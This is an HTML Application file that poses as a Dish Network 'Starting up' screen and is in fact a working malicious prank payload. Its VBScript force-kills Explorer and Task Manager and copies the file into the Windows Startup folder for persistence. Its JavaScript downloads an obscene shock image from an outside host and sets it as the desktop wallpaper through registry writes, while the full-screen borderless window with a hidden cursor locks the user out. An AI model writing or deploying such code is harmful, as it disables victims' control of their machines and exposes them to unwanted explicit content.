<HTML>
<HEAD>
 
<meta http-equiv="X-UA-Compatible" content="IE=9" />  
<HTA:APPLICATION ID="oHTA"

    APPLICATIONNAME="Starting up... Dish Network"

    WINDOWSTATE="maximize"
    BORDER="none"

   >
</HEAD>
<BODY SCROLL="no">
<style>
html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    overflow: hidden;
    background: black;
    cursor: none;
}

img {
    width: 100vw;
    height: 100vh;
    object-fit: fill; /* stretches image */
}
</style>
  <script language="VBScript">
    Set shell = CreateObject("WScript.Shell")
    shell.Run "taskkill /f /im explorer.exe", 0, True
    shell.Run "taskkill /f /im taskmgr.exe", 0, True
    shell.Run "copy %USERPROFILE%\Downloads\dishboot.hta %programdata%\Microsoft\Windows\Start Menu\Programs\Startup", 0, True
  </script>
<script language="javascript">
try {
    var url = "https://file.garden/aUYIWVAKvQxCBY-_/database/nsfw/goatse.jpg";
    var path = "C:\\dish.png";

    // Download file (no PowerShell)
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.send();

    if (xhr.status === 200) {
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1; // binary
        stream.Open();
        stream.Write(xhr.responseBody);
        stream.SaveToFile(path, 2); // overwrite
        stream.Close();
    }

    // Set wallpaper via registry
    var shell = new ActiveXObject("WScript.Shell");
    shell.RegWrite("HKCU\\Control Panel\\Desktop\\Wallpaper", path, "REG_SZ");
    shell.RegWrite("HKCU\\Control Panel\\Desktop\\WallpaperStyle", "2", "REG_SZ");
    shell.RegWrite("HKCU\\Control Panel\\Desktop\\TileWallpaper", "0", "REG_SZ");

    // Apply instantly
    shell.Run("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 0, true);

} catch (e) {}
</script>
</head>
<body>
<img src="https://file.garden/aUYIWVAKvQxCBY-_/database/images/dish.png">
</BODY>
</HTML>
